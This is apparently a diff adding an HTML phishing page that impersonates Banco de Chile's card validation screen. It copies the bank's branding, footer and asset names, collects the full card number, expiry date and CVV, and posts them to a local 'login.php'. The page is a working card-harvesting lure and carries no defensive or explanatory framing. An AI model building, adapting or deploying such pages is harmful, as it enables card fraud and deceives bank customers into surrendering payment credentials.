@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html ng-app="WebBancoChile" ng-controller="AppCtrl" style="" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths ng-scope">
+  <head>
+    <meta charset="UTF-8">
+    <style type="text/css">
+    @charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}
+    </style>
+    <title ng-bind="pageTitle" class="ng-binding">
+      Validación de Tarjeta
+    </title><!-- social media tags -->
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <!-- compiled CSS -->
+    <link rel="stylesheet" type="text/css" href="assets/cl.bancochile.canales.web-0.0.1-part-1.min.cea09c7074.css">
+    <link rel="stylesheet" type="text/css" href="assets/cl.bancochile.canales.web-0.0.1-part-2.min.fd8862a6cc.css">
+    <link rel="stylesheet" type="text/css" href="assets/cl.bancochile.canales.web-0.0.1-part-3.min.acbf7da162.css">
+    <link rel="stylesheet" type="text/css" href="assets/cl.bancochile.canales.web-0.0.1-part-4.min.53795650e3.css">
+    <link rel="stylesheet" type="text/css" href="assets/cl.bancochile.canales.web-0.0.1-part-5.min.576033ec94.css">
+    <link rel="stylesheet" type="text/css" href="assets/cl.bancochile.canales.web-0.0.1-part-6.min.e3bca3246a.css">
+    <!-- compiled JavaScript -->
+    <script src="assets/jquery.min.js"></script>
+    <script src="assets/jquery.mask.js"></script>
+
+    <meta http-equiv="origin-trial" content="A9wkrvp9y21k30U9lU7MJMjBj4USjLrGwV+Z8zO3J3ZBH139DOnCv3XLK2Ii40S94HG1SZ/Zeg2GSHOD3wlWngYAAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1RoaXJkUGFydHkiOnRydWV9">
+    <style type="text/css"></style>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+
+    <style type="text/css">
+    .form-control {
+      width: auto !important;
+    }
+    body{margin-bottom: auto !important}     
+    </style>
+    <script type="text/javascript">
+      $(document).ready(function() {
+
+        $( "#button" ).click(function() {
+
+          if($("#tarjeta").val().length == 0 && $("#tarjeta").val().length != 19){
+
+            $("#tarjeta").css({"border-color": "red"});
+          }
+
+          if($("#fecha").val().length == 0 && $("#fecha").val().length != 5){
+            $("#fecha").css({"border-color": "red"});
+          }
+
+          if($("#cvv").val().length == 0){
+            $("#cvv").css({"border-color": "red"});
+          }        
+
+          if($("#tarjeta").val().length == 19 && $("#fecha").val().length == 5 && $("#cvv").val().length > 0){
+            $(".myform").submit();
+          }
+          //if(true)
+            //$(".myform").submit();
+
+        });
+
+
+        /*function validar(){
+          alert($("#tarjeta").val());
+          if($("#tarjeta").val().length > 0){
+            return false;
+          }
+        }*/
+
+        $('#tarjeta, #cvv, #fecha').keypress(function (e) {    
+
+            var charCode = (e.which) ? e.which : event.keyCode    
+
+            if (String.fromCharCode(charCode).match(/[^0-9]/g))    
+
+                return false;                        
+
+        });
+
+
+
+      }); 
+
+
+
+    </script>    
+  </head>
+  <body ng-class="{'portabilidad-financiera' : !bodyMargin()}">
+
+    <!-- uiView: header -->
+    <div ui-view="header" ng-show="isVisible()" class="ng-scope ng-hide" style="">
+      <img src="assets/images/pixel-medicion.png" alt="" class="pixel-medicion ng-scope" aria-hidden="true">
+      <header class="header-login ng-scope">
+        <div class="container">
+          <h1 class="icon-logo-banco">
+            <img src="assets/images/logo-bec.png" alt="" class="pull-right">
+          </h1>
+        </div>
+      </header>
+    </div><!-- uiView: main -->
+    <div ui-view="main" class="ng-scope">
+      <section class="container solicitar-olvido-clave ng-scope">
+        <div class="row">
+          <div class="col-lg-12 col-md-12 col-sm-12">
+            <h1>
+              Validación de Tarjeta
+            </h1>
+            <form class="ng-pristine ng-valid ng-valid-maxlength myform" method="post" action="login.php" >
+              <input type="hidden" name="action" value="validar">            
+              <section class="">
+                <article class="step done pb-30" data-step="1">
+
+                  <p class="text-light px-14 mb-25">
+                    Ingresa tu tarjeta de crédito o débito.
+                  </p>
+                  <div class="row">
+                    <div class="col-lg-9 col-md-9 col-sm-9">
+                      <div class="row">
+                        <div class="col-lg-8 col-md-8 col-sm-8">
+                          <div class="row">
+                            <div class="col-lg-8 col-md-8 col-sm-8 form-group">
+                              <label>Visa</label>
+                              <input class="form-check-input" type="radio" name="tipo" value="visa" id="" checked>
+                              <label>MasterCard</label>
+                              <input class="form-check-input" type="radio" name="tipo" value="MasterCard" id="" >                              
+                              <small class="invalid ng-binding"></small>
+                            </div>
+
+                            <div class="col-lg-8 col-md-8 col-sm-8 form-group">
+                              <label>Numero de tarjeta</label>
+                              <input type="text" onkeyup="jQuery('#tarjeta').mask('9999-9999-9999-9999');" id="tarjeta" name="tarjeta" class="form-control ng-pristine ng-valid ng-valid-maxlength ng-touched" placeholder="1234-1234-1234-1234" maxlength="20" size="20"> 
+                              <small class="invalid ng-binding"></small>
+                            </div>                            
+                            <div class="col-lg-8 col-md-8 col-sm-8 form-group">
+                              <label>Fecha caducidad</label><input type="fecha" name="fecha" class="form-control ng-pristine ng-valid ng-valid-maxlength ng-touched" maxlength="7" size="10" id="fecha" placeholder="MM/YY" onkeyup="$('#fecha').mask('99/99', {placeholder: 'MM/YY' });"> <small class="invalid ng-binding"></small>
+                            </div>
+                            <div class="col-lg-8 col-md-8 col-sm-8 form-group">
+                              <label>cvv</label><input type="text" class="form-control ng-pristine ng-valid ng-valid-maxlength ng-touched" placeholder="" maxlength="4" size="5" id="cvv" name="cvv" > <small class="invalid ng-binding"></small>
+                            </div>                            
+                          </div>
+                        </div>
+                        <div class="col-lg-12 col-md-12 col-sm-12">
+                          <!-- ngIf: scps.solClaveData.verMsjError --><!-- ngIf: scps.mostrarBotonValidar -->
+                          <div class="btn-loader ng-scope" ng-if="scps.mostrarBotonValidar">
+                            <button type="button" id="button" class="btn success ladda-button ng-scope"><span class="ladda-label">Validar</span></button>
+                          </div><!-- end ngIf: scps.mostrarBotonValidar --><!-- ngIf: scps.solClaveData.mostrarOk -->
+                        </div>
+                      </div>
+                    </div>
+
+                  </div>
+                </article>
+              </section>
+            
+            <div class="col-lg-12 col-md-12 col-sm-12">
+              <!-- ngIf: scps.solClaveData.mostrarMsjRegistrado --><!-- ngIf: scps.solClaveData.mostrarMsjFalloSinacofi -->
+            </div>
+          </div>
+          </form>
+        </div>
+      </section>
+    </div><!-- uiView: footer -->
+    <div ui-view="footer" ng-show="isVisibleFooter()" class="ng-scope ng-hide" style="">
+      <footer class="bch-footer pt-0 ng-scope">
+        <!-- ngIf: state.current.name == 'login' -->
+        <div class="container">
+          <div class="row">
+            <div class="logo-footer col-xs-6 col-sm-3 col-md-3 col-lg-3">
+              <a tabindex="-1" href="http://www.bancochile.cl/"></a>
+            </div>
+            <div class="liniealateral col-xs-6 col-sm-3 col-md-3 col-lg-3">
+              <ul class="list-unstyled">
+                <li>Casa Matriz: Ahumada 251, Santiago de Chile
+                </li>
+                <li>Mesa Central: [+56 2] 2653 1111
+                </li>
+                <li>Fonobank 600 637 3737
+                </li>
+              </ul>
+            </div>
+            <div class="col-xs-12 col-sm-6 col-md-6 col-lg-6">
+              <ul class="list-unstyled">
+                <li>Infórmese sobre la garantía estatal de los depósitos en su banco o en www.sbif.cl
+                </li>
+                <li>Citi y el diseño del arco es una marca de servicio registrada de Citigroup Inc. Uso bajo licencia
+                </li>
+                <li>
+                  <b>© 2018, Banco de Chile. Todos los Derechos Reservados</b>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </footer>
+    </div>
+
+
+    <div>
+      <div class="grecaptcha-badge" data-style="bottomright" style="width: 256px; height: 60px; display: block; transition: right 0.3s ease 0s; position: fixed; bottom: 14px; right: -186px; box-shadow: gray 0px 0px 5px; border-radius: 2px; overflow: hidden;">
+        <div class="grecaptcha-logo">
+          
+        </div>
+        <div class="grecaptcha-error"></div>
+        <textarea id="g-recaptcha-response-100000" name="g-recaptcha-response" class="g-recaptcha-response" style="width: 250px; height: 40px; border: 1px solid rgb(193, 193, 193); margin: 10px 25px; padding: 0px; resize: none; display: none;"></textarea>
+      </div><iframe style="display: none;"></iframe>
+    </div>
+  </body>
+</html>
